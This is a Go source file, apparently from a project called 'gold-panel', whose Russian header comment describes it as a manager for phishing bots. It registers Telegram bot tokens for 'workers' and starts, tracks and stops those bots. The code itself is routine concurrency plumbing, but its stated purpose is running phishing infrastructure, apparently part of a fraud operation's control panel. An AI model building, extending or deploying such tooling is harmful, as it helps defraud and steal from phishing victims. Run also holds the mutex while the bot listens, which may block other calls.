//workers manager
//менеджер фишинг ботов

package workmanager

import (
	"context"
	"fmt"
	"gold-panel/internal/service/v1"
	"gold-panel/internal/workmanager/workerbot"
	"sync"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sirupsen/logrus"
)

type WorkManager struct {
	mx      sync.Mutex
	running map[int64]*workerbot.WorkerBot
	service service.IService
}

func NewWorkManager(service service.IService) *WorkManager {
	return &WorkManager{
		running: make(map[int64]*workerbot.WorkerBot),
		service: service,
	}
}

func (m *WorkManager) GetBotMe(token string) (*tgbotapi.User, error) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, err
	}

	me, err := bot.GetMe()
	if err != nil {
		return nil, err
	}
	return &me, nil
}

type AddDTO struct {
	ID       int64
	Token    string
	Username string
}

func (m *WorkManager) Add(dto *AddDTO) error {
	return m.service.WorkerAdd(
		context.Background(),
		&service.WorkerAddDTO{
			ID:       dto.ID,
			Token:    dto.Token,
			Username: dto.Username,
		},
	)
}

func (m *WorkManager) IsRunning(workerID int64) bool {
	m.mx.Lock()
	defer m.mx.Unlock()
	_, ok := m.running[workerID]
	return ok
}

func (m *WorkManager) Run(ctx context.Context, workerID int64) error {
	if m.IsRunning(workerID) {
		return nil
	}

	worker, err := workerbot.NewWorkerBot(ctx, workerID, m.service)
	if err != nil {
		return fmt.Errorf("work manager: run: %w", err)
	}

	m.mx.Lock()
	defer m.mx.Unlock()

	m.running[workerID] = worker
	err = worker.Listen()
	return err
}

func (m *WorkManager) RunAll(ctx context.Context) {
	workerIDs, err := m.service.WorkerGetAllID(ctx)
	if err != nil {
		logrus.Error(err)
		return
	}

	for _, workerID := range workerIDs {
		if err := m.Run(context.Background(), workerID); err != nil {
			logrus.Error(err)
		}
	}
}

func (m *WorkManager) Finish(workerID int64) {
	m.mx.Lock()
	defer m.mx.Unlock()

	if worker, ok := m.running[workerID]; ok {
		worker.Finish()
		delete(m.running, workerID)
	}
}

func (m *WorkManager) FinishAll() {
	m.mx.Lock()
	defer m.mx.Unlock()

	for workerID := range m.running {
		m.running[workerID].Finish()
		delete(m.running, workerID)
	}
}
